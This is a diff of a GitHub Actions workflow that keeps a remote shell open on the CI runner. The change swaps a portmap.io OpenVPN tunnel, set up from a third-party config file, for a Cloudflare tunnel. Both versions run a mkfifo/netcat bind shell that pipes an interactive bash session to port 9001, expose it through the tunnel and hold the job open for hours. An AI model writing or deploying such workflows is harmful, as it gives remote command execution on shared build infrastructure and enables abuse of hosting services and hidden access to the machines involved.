@@ -1,4 +1,4 @@
-name: Bash Reverse Shell with Portmap.io (Updated Tunnel - Listening Shell)
+name: Cloudflare Tunnel and Reverse Shell
 
 on:
   push:
@@ -15,46 +15,38 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y openvpn netcat-openbsd wget
+          sudo apt install -y wget unzip netcat-openbsd
 
-      - name: Download OpenVPN Configuration
+      - name: Download cloudflared
         run: |
-          echo "=== Downloading OpenVPN Configuration ==="
-          wget https://raw.githubusercontent.com/lust001/openvpn/refs/heads/main/vpsfree9009.anonymous1.ovpn -O anonymous1-22216.ovpn
-          ls -l
+          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+          sudo dpkg -i cloudflared-linux-amd64.deb
 
-      - name: Configure Portmap.io Tunnel
+      - name: Authenticate cloudflared
         env:
-          PORTMAP_USERNAME: ${{ secrets.PORTMAP_USERNAME }}
-          PORTMAP_PASSWORD: ${{ secrets.PORTMAP_PASSWORD }}
+          CLOUDFLARE_AUTH_TOKEN: ${{ secrets.CLOUDFLARE_AUTH_TOKEN }}
         run: |
-          echo "=== Setting up Portmap.io tunnel ==="
-          # Save OpenVPN auth file
-          echo "$PORTMAP_USERNAME" > auth.txt
-          echo "$PORTMAP_PASSWORD" >> auth.txt
-          sudo chmod 600 auth.txt
-          # Update OpenVPN config to use auth file
-          sudo sed -i '/auth-user-pass/c\auth-user-pass auth.txt' anonymous1-22216.ovpn
-          # Start OpenVPN tunnel
-          sudo openvpn --config anonymous1-22216.ovpn --daemon
-          sleep 10
-          echo "=== OpenVPN Status ==="
-          ps aux | grep '[o]penvpn' || echo "No OpenVPN process found"
-          echo "=== Tunnel Endpoint ==="
-          echo "tcp://vpsfree9009-22216.portmap.io:22216"
+          echo "$CLOUDFLARE_AUTH_TOKEN" | cloudflared tunnel login
 
-      - name: Start Bash Reverse Shell (Listening)
+      - name: Create and Run Tunnel
+        run: |
+          cloudflared tunnel create github-actions-tunnel || true # Ignore if already exists
+          TUNNEL_ID=$(cloudflared tunnel list | grep "github-actions-tunnel" | awk '{print $1}')
+          echo "Tunnel ID: $TUNNEL_ID"
+          cloudflared tunnel run $TUNNEL_ID --url tcp://localhost:9001 &
+          echo "Cloudflare Tunnel running in the background..."
+          sleep 10 # Give it some time to establish
+
+      - name: Start Reverse Shell (Listening)
         run: |
           echo "=== Starting reverse shell (listening) ==="
-          # Start netcat in listening mode on port 9001 and execute bash upon connection
           mkfifo /tmp/backpipe
           /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
           sleep 5
-          ps aux | grep '[n]c -lvnp 9001' || echo "Netcat listening process not found"
-          echo "=== Netcat is listening on port 9001. Connect to tcp://vpsfree9009-22216.portmap.io:22216 from your local machine ==="
-          # Keep workflow alive for 6 hours
+          echo "=== Netcat is listening on port 9001 ==="
+          echo "=== Check your Cloudflare Tunnel public URL to connect ==="
+          echo "You can find the URL in your Cloudflare Dashboard under Access -> Tunnels -> github-actions-tunnel -> Public Hostnames (TCP tab)."
+          # Keep workflow alive
           for i in {1..360}; do
-            ps aux | grep '[n]c -lvnp 9001' || echo "Netcat listening process stopped"
-            ps aux | grep '[o]penvpn' || echo "OpenVPN process stopped"
             sleep 60
           done
